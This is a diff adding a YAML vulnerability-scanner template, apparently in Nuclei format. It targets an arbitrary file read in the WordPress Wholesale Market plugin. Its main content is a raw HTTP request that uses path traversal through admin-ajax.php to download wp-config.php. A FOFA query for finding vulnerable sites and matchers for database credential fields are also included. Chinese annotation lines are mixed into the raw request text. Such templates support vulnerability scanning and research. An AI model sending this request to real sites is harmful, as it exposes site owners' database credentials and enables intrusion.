@@ -1,0 +1,40 @@
+id: poc-eouu2r1fbwkd6iso
+info:
+  name: Wordpress Wholesale Market任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eouu2r1fbwkd6iso'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eouu2r1fbwkd6iso
+    fofa: body="wp-content/plugins/wholesale-market"
+http:
+- raw:
+  - 'GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?DB_NAME)(?=.*?DB_USER).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
